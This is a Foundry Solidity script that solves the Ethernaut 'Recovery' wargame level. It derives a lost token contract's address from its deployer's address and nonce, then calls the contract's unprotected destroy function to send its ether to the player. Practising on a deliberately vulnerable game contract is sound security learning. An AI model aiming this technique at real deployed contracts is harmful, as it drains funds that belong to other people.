// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {Recovery, SimpleToken} from "../src/Level17.sol";

contract Level17 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address me = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        Recovery instance = Recovery(vm.envAddress("LVL17_ADDR"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed
        address contractFound = address(
            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(instance), bytes1(0x01)))))
        );
        if (contractFound.balance != 0) {
            SimpleToken(payable(contractFound)).destroy(payable(me));
            if (contractFound.balance == 0) {
                console2.log("Level17: Success");
                ethernaut.submitLevelInstance(address(instance));
            } else {
                console2.log("Level17: Failed 2");
            }
        } else {
            console2.log("Level17: Failed 1");
        }

        vm.stopBroadcast();
    }
}
